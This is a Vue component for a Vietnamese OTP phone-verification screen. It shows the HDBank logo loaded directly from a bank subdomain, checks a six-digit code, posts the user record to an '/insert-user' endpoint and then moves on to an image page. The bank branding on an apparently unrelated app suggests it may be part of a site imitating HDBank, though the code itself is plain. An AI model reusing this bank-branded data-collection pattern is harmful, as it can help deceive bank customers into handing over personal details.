<template>
    <div class="wrap-main">
        <div>
            <div style="display: flex; justify-content: center">
                <a href="">
                    <v-img cover width="133px" src="https://sieuthe4trong1.hdbank.com.vn/images/logo.svg" alt=""></v-img>
                </a>
            </div>
        </div>
        <div style="margin-top: 20px">
            <v-sheet class="bg-gray">
                <h3 class="text-center" style="color: red">Xác thực</h3>
                <h3 class="text-center" style="color: red">số điện thoại</h3>

                <p class="text-center my-5">Nhập mã xác thực (OTP) đã được gửi đến số điện thoại của bạn</p>

                <span>Mã xác thực có hiệu lực trong <span>{{ minutes < 10 ? '0' + minutes : minutes }}</span>:<span>{{
                    seconds < 10 ? '0' + seconds : seconds }}</span> giây</span>

                            <OTP size="medium" :fields="fieldSize" class="my-5"
                                inputstyle="width: 50px; height: 50px; font-size: 40px; margin: 3px; border-radius: 5px;"
                                type="mix" className="example-class-name" @OTPValueChanged="changeOtpValue" />
                            <v-btn :loading="loading" type="button" @click="submit" block color="red" class="my-5">Tiếp
                                tục</v-btn>
            </v-sheet>
        </div>
    </div>
</template>
<script setup>
import { ref, computed, watch, onMounted } from 'vue'
import { useStore } from 'vuex'
import { useRouter } from 'vue-router'
import { OTP } from "vue3-otp-input-field";
import axios from '@/plugins/axios';
const router = useRouter()
const store = useStore()
const loading = ref(false)
const otp = ref([])

const user = computed(() => store.state.user)

const seconds = ref(0)
const minutes = ref(0)

// ineterval timer for otp code 2 minutes

onMounted(() => {
    // if (!user.value.verified) {
    //     router.push({ name: 'Home' })
    // }
})
onMounted(() => {
    minutes.value = 2
    seconds.value = 0

    const timer = setInterval(() => {
        if (seconds.value === 0) {
            if (minutes.value === 0) {
                clearInterval(timer)
                // router.push({ name: 'Home' })
            } else {
                minutes.value--
                seconds.value = 59
            }
        } else {
            seconds.value--
        }
    }, 1000)

    return () => clearInterval(timer)
})

watch([minutes, seconds], () => {
    if (minutes.value === 0 && seconds.value === 0) {
        store.commit('setSnackbar', {
            type: true,
            color: 'error',
            message: 'Mã OTP đã hết hạn.',
        })
    }
})


const changeOtpValue = (value) => {
    otp.value = value
}
const fieldSize = 6

const submit = () => {
    loading.value = true

    if (otp.value.length < 6) {
        store.commit('setSnackbar', {
            type: true,
            color: 'error',
            message: 'Vui lòng nhập đủ 6 số.',
        })
        loading.value = false
        return
    }

    const code = otp.value.join('')

    if (window.confirmationResult === undefined) {
        store.commit('setSnackbar', {
            type: true,
            color: 'error',
            message: 'Vui lòng đăng ký số điện thoại trước.',
        })
        loading.value = false
        return
    }

    window.confirmationResult.confirm(code).then((result) => {

        axios.post('/insert-user', {
            ...user.value,
            verified: true,
        }).then(res => {
            store.commit('setUser', {
                ...user.value,
                verified: true,
            })
            store.commit('setSnackbar', {
                type: true,
                color: 'success',
                message: 'Xác thực thành công.',
            })
            loading.value = false

            router.push({ name: 'image' })
        }).catch(err => {
            console.log(err)
            loading.value = false
            store.commit('setSnackbar', {
                type: true,
                color: 'error',
                message: 'Có lỗi xảy ra, vui lòng thử lại.',
            })
        })

    }).catch((error) => {
        console.log(error);
        loading.value = false
        store.commit('setSnackbar', {
            type: true,
            color: 'error',
            message: 'Mã OTP không chính xác.',
        })
    });
}




</script>
<style>
.wrap-main {
    width: 375px;
    height: 100vh;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    -webkit-transform: translate(-50%, -50%);
    -moz-transform: translate(-50%, -50%);
    -ms-transform: translate(-50%, -50%);
    -o-transform: translate(-50%, -50%);
    align-self: center;
    align-items: center;
    margin-top: 20px;
}

.bg-gray {
    background-color: #ccc !important;
    padding: 3rem;
    border-radius: 10px !important;
    height: 90vh;
}

h3 {
    font-size: 32px;
    font-weight: 500;
    margin: 0;
    padding: 0;
}

span {
    font-size: 14px;
}

input {
    background-color: revert !important;
    width: 40px !important;
    height: 40px !important;
}
</style>